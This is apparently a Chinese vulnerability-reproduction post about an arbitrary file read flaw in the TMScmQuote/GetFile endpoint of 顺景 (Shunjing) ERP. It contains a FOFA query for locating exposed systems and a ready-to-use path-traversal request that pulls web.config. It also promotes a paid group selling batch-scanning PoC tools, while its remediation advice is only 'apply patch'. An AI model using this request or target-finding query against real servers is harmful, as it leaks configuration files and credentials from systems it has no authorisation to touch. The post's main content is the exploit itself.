#  顺景ERP TMScmQuote/GetFile接口存在任意文件读取漏洞 附POC   
2025-3-17更新  南风漏洞复现文库   2025-03-17 22:51  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 顺景ERP 接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
顺景ERP  
## 2.漏洞描述  
  
顺景ERP GetFile接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
顺景ERP  
  
![顺景ERP TMScmQuote/GetFile接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPyChGIT0JtrGPYkqK0VDWc2bXia0ibFHdavsUYT8zFBUPjPDibGVgxNPhA/640?wx_fmt=png&from=appmsg "null")  
  
顺景ERP TMScmQuote/GetFile接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="/api/DBRecord/getDBRecords"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName=  
  
漏洞数据包：  
```
GET /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName= HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPicLt1V58EmV32q01yiau1DKicGqkJTUmcDUfJHvpajmCIfcworE18PCKw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
  
2: 免登录，免费fofa查询。  
  
3: 更新其他实用网络安全工具项目。  
  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPIwQZjAImnjB6elEib7htrGv9XeUIG1lM1icUOmpOuibAztnrce3sdUFCg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPp4CYicJD0VwDBOUDQguQLBJ5v9BTA9pPM8hHUxSib40FTEUCJUAIU8Zg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVP1MSPiaOAu73SL5371Nqm1vKibL7LIicdDk7kSRpmn4pZ8RuYZSjkMibN2w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPWKyzAPZuuro21nFPRgxbOjgNlG4zqiaoTZDkGZ20zaDYm9h2UiaM1rzg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZzsuQSH9US0SaMzVHlpXVPwrT0zB02dgYicORB85Zp5aTANRcfLP14hV9ymI6Q1DtqDfLSOjIj4UA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
  
